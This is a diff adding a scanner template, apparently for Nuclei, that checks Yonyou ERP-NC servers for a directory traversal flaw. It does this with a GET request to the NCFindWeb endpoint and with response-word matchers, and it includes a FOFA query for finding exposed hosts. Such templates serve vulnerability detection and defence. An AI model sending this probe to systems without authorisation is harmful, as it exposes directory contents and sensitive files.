@@ -1,0 +1,29 @@
+id: ERP-NC_traversal
+info:
+  name: 用友ERP-NC_traversal
+  author: mike
+  severity: info
+  description: https://www.cnblogs.com/pursue-security/p/17684954.html
+  reference: 用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-UFIDA-NC"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Client"
+          - "ncwslogin.jsp"
+          - "admin.jsp"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
